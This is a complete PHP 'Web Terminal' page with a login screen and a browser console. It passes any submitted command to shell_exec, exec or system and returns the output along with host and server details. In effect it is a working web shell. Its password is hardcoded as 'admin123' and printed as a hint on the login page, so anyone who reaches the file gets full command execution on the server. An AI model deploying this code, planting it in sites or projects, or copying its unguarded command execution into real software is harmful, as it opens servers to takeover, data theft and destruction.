<?php
$PASSWORD = "admin123";  // Ganti password jika perlu
session_start();
if (isset($_GET['api']) || isset($_POST['api'])) {
    header('Content-Type: application/json');
    
    $action = $_POST['action'] ?? $_GET['action'] ?? '';
    
    // LOGIN ACTION
    if ($action === 'login') {
        $password = $_POST['password'] ?? '';
        
        if ($password === $PASSWORD) {
            $_SESSION['terminal_auth'] = true;
            $_SESSION['user'] = 'admin';
            $_SESSION['login_time'] = time();
            
            echo json_encode([
                'success' => true,
                'message' => 'Login successful',
                'cwd' => getcwd(),
                'user' => 'admin',
                'hostname' => gethostname() ?: 'localhost'
            ]);
        } else {
            echo json_encode([
                'success' => false,
                'error' => 'Invalid password'
            ]);
        }
        exit;
    }
    
    // CHECK AUTH
    if (!isset($_SESSION['terminal_auth']) || $_SESSION['terminal_auth'] !== true) {
        echo json_encode(['error' => 'Not authenticated']);
        exit;
    }
    
    // EXECUTE COMMAND
    if ($action === 'execute') {
        $command = $_POST['command'] ?? '';
        $output = '';
        
        // Handle CD command
        if (preg_match('/^\s*cd\s+(.+)$/', $command, $matches)) {
            $dir = trim($matches[1], " '\"");
            
            if ($dir === '..') {
                chdir('..');
                $output = '';
            } elseif ($dir && $dir !== '.') {
                if (is_dir($dir)) {
                    chdir($dir);
                    $output = '';
                } else {
                    $output = "cd: no such directory: $dir";
                }
            }
            
            echo json_encode([
                'output' => $output,
                'cwd' => getcwd(),
                'success' => true
            ]);
            exit;
        }
        
        // Handle CLEAR command
        if (trim($command) === 'clear' || trim($command) === 'cls') {
            echo json_encode([
                'clear' => true,
                'cwd' => getcwd()
            ]);
            exit;
        }
        
        // Handle PWD command
        if (trim($command) === 'pwd') {
            echo json_encode([
                'output' => getcwd(),
                'cwd' => getcwd()
            ]);
            exit;
        }
        
        // Execute other commands
        if (function_exists('shell_exec')) {
            $output = shell_exec($command . ' 2>&1');
        } elseif (function_exists('exec')) {
            exec($command . ' 2>&1', $output_array);
            $output = implode("\n", $output_array);
        } elseif (function_exists('system')) {
            ob_start();
            system($command . ' 2>&1');
            $output = ob_get_clean();
        } else {
            $output = 'Command execution not available';
        }
        
        echo json_encode([
            'output' => $output ? trim($output) : '(no output)',
            'cwd' => getcwd(),
            'success' => true
        ]);
        exit;
    }
    
    // LOGOUT ACTION
    if ($action === 'logout') {
        session_destroy();
        echo json_encode(['success' => true]);
        exit;
    }
    
    // SYSTEM INFO
    if ($action === 'info') {
        echo json_encode([
            'user' => $_SESSION['user'] ?? 'unknown',
            'hostname' => gethostname() ?: 'localhost',
            'os' => PHP_OS,
            'php_version' => PHP_VERSION,
            'cwd' => getcwd(),
            'server_software' => $_SERVER['SERVER_SOFTWARE'] ?? 'Unknown'
        ]);
        exit;
    }
    
    echo json_encode(['error' => 'Unknown action']);
    exit;
}

// ============================================
// SHOW LOGIN SCREEN OR TERMINAL
// ============================================
if (!isset($_SESSION['terminal_auth']) || $_SESSION['terminal_auth'] !== true) {
    showLoginScreen();
    exit;
}

showTerminal();
exit;

// ============================================
// FUNCTIONS
// ============================================
function showLoginScreen() {
    global $PASSWORD;
    ?>
    <!DOCTYPE html>
    <html>
    <head>
        <meta charset="UTF-8">
        <meta name="viewport" content="width=device-width, initial-scale=1.0">
        <title>Web Terminal Login</title>
        <style>
            body {
                font-family: 'Courier New', monospace;
                background: #0a0e14;
                color: #b3b1ad;
                display: flex;
                justify-content: center;
                align-items: center;
                height: 100vh;
                margin: 0;
            }
            .login-container {
                background: #1c2023;
                border: 1px solid #3d444d;
                border-radius: 5px;
                padding: 30px;
                width: 350px;
                box-shadow: 0 0 20px rgba(0,0,0,0.5);
            }
            .login-header {
                text-align: center;
                margin-bottom: 30px;
                color: #80a665;
            }
            .login-header h1 {
                margin: 0;
                font-size: 24px;
            }
            .login-form input {
                width: 100%;
                padding: 12px;
                margin-bottom: 15px;
                background: #0a0e14;
                border: 1px solid #3d444d;
                color: #b3b1ad;
                border-radius: 3px;
                font-family: 'Courier New', monospace;
                font-size: 14px;
                box-sizing: border-box;
            }
            .login-form input:focus {
                outline: none;
                border-color: #80a665;
            }
            .login-form button {
                width: 100%;
                padding: 12px;
                background: #80a665;
                color: #0a0e14;
                border: none;
                border-radius: 3px;
                font-family: 'Courier New', monospace;
                font-size: 14px;
                font-weight: bold;
                cursor: pointer;
                transition: background 0.3s;
            }
            .login-form button:hover {
                background: #90b675;
            }
            .error-message {
                color: #e67e80;
                text-align: center;
                margin-bottom: 15px;
                padding: 10px;
                background: rgba(230, 126, 128, 0.1);
                border-radius: 3px;
                display: none;
            }
            .password-hint {
                text-align: center;
                margin-top: 15px;
                font-size: 12px;
                color: #6c7986;
            }
        </style>
    </head>
    <body>
        <div class="login-container">
            <div class="login-header">
                <h1>TERMINAL ACCESS</h1>
                <p>Enter password to continue</p>
            </div>
            
            <div class="error-message" id="errorMsg"></div>
            
            <form class="login-form" id="loginForm">
                <input type="password" 
                       id="password" 
                       placeholder="Password" 
                       autocomplete="off" 
                       autofocus
                       required>
                <button type="submit">CONNECT</button>
            </form>
            
            <div class="password-hint">
                Default password: <code>admin123</code>
            </div>
        </div>

        <script>
            document.getElementById('loginForm').onsubmit = async function(e) {
                e.preventDefault();
                
                const password = document.getElementById('password').value;
                const errorMsg = document.getElementById('errorMsg');
                
                if (!password) {
                    showError('Password is required');
                    return false;
                }
                
                try {
                    const formData = new FormData();
                    formData.append('api', '1');
                    formData.append('action', 'login');
                    formData.append('password', password);
                    
                    const response = await fetch('?', {
                        method: 'POST',
                        body: formData
                    });
                    
                    const data = await response.json();
                    
                    if (data.success) {
                        // Login successful, reload to show terminal
                        window.location.href = '?';
                    } else {
                        showError(data.error || 'Invalid password');
                        document.getElementById('password').value = '';
                        document.getElementById('password').focus();
                    }
                    
                } catch (error) {
                    showError('Connection failed: ' + error.message);
                }
                
                return false;
            };
            
            function showError(message) {
                const errorMsg = document.getElementById('errorMsg');
                errorMsg.textContent = message;
                errorMsg.style.display = 'block';
                
                // Hide error after 3 seconds
                setTimeout(() => {
                    errorMsg.style.display = 'none';
                }, 3000);
            }
            
            // Clear error when user starts typing
            document.getElementById('password').addEventListener('input', function() {
                document.getElementById('errorMsg').style.display = 'none';
            });
            
            // Focus password input on load
            document.getElementById('password').focus();
        </script>
    </body>
    </html>
    <?php
}

function showTerminal() {
    ?>
    <!DOCTYPE html>
    <html>
    <head>
        <meta charset="UTF-8">
        <meta name="viewport" content="width=device-width, initial-scale=1.0">
        <title>Web Terminal</title>
        <style>
            * {
                margin: 0;
                padding: 0;
                box-sizing: border-box;
            }
            
            body {
                font-family: 'Consolas', 'Monaco', monospace;
                background: #1e1e1e;
                color: #d4d4d4;
                height: 100vh;
                overflow: hidden;
            }
            
            #terminal-container {
                display: flex;
                flex-direction: column;
                height: 100vh;
            }
            
            .terminal-header {
                background: #2d2d30;
                padding: 10px 20px;
                border-bottom: 1px solid #3e3e42;
                display: flex;
                justify-content: space-between;
                align-items: center;
            }
            
            .header-left {
                display: flex;
                align-items: center;
                gap: 15px;
            }
            
            .header-title {
                color: #569cd6;
                font-weight: bold;
            }
            
            .header-info {
                font-size: 12px;
                color: #9cdcfe;
            }
            
            .header-right button {
                background: #3e3e42;
                color: #d4d4d4;
                border: 1px solid #505050;
                padding: 5px 15px;
                margin-left: 5px;
                border-radius: 3px;
                cursor: pointer;
                font-family: 'Consolas', monospace;
                font-size: 12px;
            }
            
            .header-right button:hover {
                background: #505050;
            }
            
            #terminal-output {
                flex: 1;
                padding: 20px;
                overflow-y: auto;
                font-size: 14px;
                line-height: 1.4;
                background: #1e1e1e;
            }
            
            .output-line {
                margin-bottom: 5px;
                white-space: pre-wrap;
                word-break: break-word;
            }
            
            .command-line {
                color: #9cdcfe;
            }
            
            .prompt {
                color: #4ec9b0;
                font-weight: bold;
            }
            
            .error {
                color: #f44747;
            }
            
            .success {
                color: #6a9955;
            }
            
            #input-area {
                display: flex;
                background: #252526;
                border-top: 1px solid #3e3e42;
                padding: 10px;
            }
            
            #prompt-display {
                color: #4ec9b0;
                font-weight: bold;
                margin-right: 10px;
                white-space: nowrap;
                line-height: 24px;
            }
            
            #command-input {
                flex: 1;
                background: transparent;
                border: none;
                color: #d4d4d4;
                font-family: 'Consolas', monospace;
                font-size: 14px;
                outline: none;
                caret-color: #d4d4d4;
            }
            
            /* Scrollbar */
            #terminal-output::-webkit-scrollbar {
                width: 10px;
            }
            
            #terminal-output::-webkit-scrollbar-track {
                background: #1e1e1e;
            }
            
            #terminal-output::-webkit-scrollbar-thumb {
                background: #424242;
                border-radius: 5px;
            }
            
            #terminal-output::-webkit-scrollbar-thumb:hover {
                background: #505050;
            }
            
            /* Cursor */
            .cursor {
                display: inline-block;
                width: 8px;
                height: 16px;
                background-color: #d4d4d4;
                margin-left: 2px;
                animation: blink 1s infinite;
            }
            
            @keyframes blink {
                0%, 50% { opacity: 1; }
                51%, 100% { opacity: 0; }
            }
        </style>
    </head>
    <body>
        <div id="terminal-container">
            <div class="terminal-header">
                <div class="header-left">
                    <div class="header-title">💻 WEB TERMINAL</div>
                    <div class="header-info">
                        User: <?php echo htmlspecialchars($_SESSION['user'] ?? 'admin'); ?> | 
                        Dir: <span id="current-dir"><?php echo htmlspecialchars(getcwd()); ?></span>
                    </div>
                </div>
                <div class="header-right">
                    <button onclick="executeCommand('clear')">Clear</button>
                    <button onclick="showSystemInfo()">Info</button>
                    <button onclick="logout()">Logout</button>
                </div>
            </div>
            
            <div id="terminal-output">
                <div class="output-line success">
                    Welcome to Web Terminal! Session started at <?php echo date('H:i:s'); ?>
                </div>
                <div class="output-line">
                    Type <span style="color: #4ec9b0">help</span> for available commands
                </div>
                <div class="output-line">
                    ----------------------------------------------------
                </div>
            </div>
            
            <div id="input-area">
                <div id="prompt-display">$</div>
                <input type="text" 
                       id="command-input" 
                       autocomplete="off" 
                       autofocus 
                       placeholder="Type command...">
                <div class="cursor"></div>
            </div>
        </div>

        <script>
            // Global variables
            let commandHistory = [];
            let historyIndex = -1;
            let currentDir = '<?php echo addslashes(getcwd()); ?>';
            
            // DOM elements
            const terminalOutput = document.getElementById('terminal-output');
            const commandInput = document.getElementById('command-input');
            const promptDisplay = document.getElementById('prompt-display');
            const currentDirSpan = document.getElementById('current-dir');
            
            // Initialize
            document.addEventListener('DOMContentLoaded', function() {
                updatePrompt();
                
                // Focus input
                commandInput.focus();
                
                // Command history
                commandInput.addEventListener('keydown', function(e) {
                    switch(e.key) {
                        case 'Enter':
                            e.preventDefault();
                            executeCommand(commandInput.value.trim());
                            break;
                            
                        case 'ArrowUp':
                            e.preventDefault();
                            if (commandHistory.length > 0) {
                                if (historyIndex > 0) historyIndex--;
                                if (historyIndex >= 0) {
                                    commandInput.value = commandHistory[historyIndex];
                                }
                            }
                            break;
                            
                        case 'ArrowDown':
                            e.preventDefault();
                            if (historyIndex < commandHistory.length - 1) {
                                historyIndex++;
                                commandInput.value = commandHistory[historyIndex];
                            } else {
                                historyIndex = commandHistory.length;
                                commandInput.value = '';
                            }
                            break;
                    }
                });
                
                // Auto-focus when clicking anywhere
                document.body.addEventListener('click', function() {
                    commandInput.focus();
                });
                
                // Show initial help
                addOutput('<span class="prompt">$</span> <span class="command-line">help</span>');
                addOutput('<div class="output-line">Available commands:</div>');
                addOutput('<div class="output-line">  help, clear, pwd, ls, cd, whoami, uname, cat</div>');
            });
            
            // Update prompt with current directory
            function updatePrompt() {
                let displayDir = currentDir;
                
                // Shorten long paths
                if (displayDir.length > 30) {
                    displayDir = '...' + displayDir.substr(-27);
                }
                
                promptDisplay.textContent = displayDir + ' $';
                currentDirSpan.textContent = displayDir;
            }
            
            // Execute command
            async function executeCommand(command) {
                if (!command.trim()) return;
                
                // Add to history
                commandHistory.push(command);
                historyIndex = commandHistory.length;
                
                // Show command in terminal
                addCommand(command);
                
                // Clear input
                commandInput.value = '';
                
                // Handle clear command locally
                if (command === 'clear' || command === 'cls') {
                    terminalOutput.innerHTML = `
                        <div class="output-line success">Terminal cleared</div>
                        <div class="output-line">----------------------- O_O -----------------------</div>
                    `;
                    return;
                }
                
                // Handle help command locally
                if (command === 'help') {
                    addOutput('<div class="output-line">Available commands:</div>');
                    addOutput('<div class="output-line">  help     - Show this help</div>');
                    addOutput('<div class="output-line">  clear    - Clear terminal</div>');
                    addOutput('<div class="output-line">  pwd      - Current directory</div>');
                    addOutput('<div class="output-line">  ls       - List files</div>');
                    addOutput('<div class="output-line">  cd       - Change directory</div>');
                    addOutput('<div class="output-line">  whoami   - Current user</div>');
                    addOutput('<div class="output-line">  uname    - System info</div>');
                    addOutput('<div class="output-line">  cat      - View file</div>');
                    scrollToBottom();
                    return;
                }
                
                // Send command to server
                try {
                    const formData = new FormData();
                    formData.append('api', '1');
                    formData.append('action', 'execute');
                    formData.append('command', command);
                    
                    const response = await fetch('?', {
                        method: 'POST',
                        body: formData
                    });
                    
                    const data = await response.json();
                    
                    if (data.error) {
                        addOutput('<div class="error">Error: ' + data.error + '</div>');
                    } else if (data.clear) {
                        terminalOutput.innerHTML = `
                            <div class="output-line success">Terminal cleared</div>
                            <div class="output-line">----------------------------------------------------</div>
                        `;
                    } else {
                        if (data.output) {
                            addOutput('<div class="output-line">' + escapeHtml(data.output) + '</div>');
                        }
                        
                        if (data.cwd && data.cwd !== currentDir) {
                            currentDir = data.cwd;
                            updatePrompt();
                        }
                    }
                    
                } catch (error) {
                    addOutput('<div class="error">Connection error: ' + error.message + '</div>');
                }
                
                scrollToBottom();
            }
            
            // Show system info
            async function showSystemInfo() {
                addCommand('systeminfo');
                
                try {
                    const formData = new FormData();
                    formData.append('api', '1');
                    formData.append('action', 'info');
                    
                    const response = await fetch('?', {
                        method: 'POST',
                        body: formData
                    });
                    
                    const data = await response.json();
                    
                    if (!data.error) {
                        addOutput('<div class="output-line">=== SYSTEM INFORMATION ===</div>');
                        addOutput('<div class="output-line">User: ' + data.user + '</div>');
                        addOutput('<div class="output-line">Hostname: ' + data.hostname + '</div>');
                        addOutput('<div class="output-line">OS: ' + data.os + '</div>');
                        addOutput('<div class="output-line">PHP: ' + data.php_version + '</div>');
                        addOutput('<div class="output-line">Directory: ' + data.cwd + '</div>');
                        addOutput('<div class="output-line">Server: ' + data.server_software + '</div>');
                    }
                    
                } catch (error) {
                    addOutput('<div class="error">Error getting system info</div>');
                }
                
                scrollToBottom();
            }
            
            // Logout
            async function logout() {
                try {
                    const formData = new FormData();
                    formData.append('api', '1');
                    formData.append('action', 'logout');
                    
                    await fetch('?', {
                        method: 'POST',
                        body: formData
                    });
                    
                    window.location.href = '?';
                    
                } catch (error) {
                    addOutput('<div class="error">Logout error</div>');
                }
            }
            
            // Helper functions
            function addCommand(command) {
                const line = document.createElement('div');
                line.className = 'output-line';
                line.innerHTML = '<span class="prompt">' + promptDisplay.textContent + '</span> <span class="command-line">' + escapeHtml(command) + '</span>';
                terminalOutput.appendChild(line);
            }
            
            function addOutput(content) {
                const line = document.createElement('div');
                line.className = 'output-line';
                line.innerHTML = content;
                terminalOutput.appendChild(line);
            }
            
            function scrollToBottom() {
                terminalOutput.scrollTop = terminalOutput.scrollHeight;
            }
            
            function escapeHtml(text) {
                const div = document.createElement('div');
                div.textContent = text;
                return div.innerHTML;
            }
        </script>
    </body>
    </html>
    <?php
}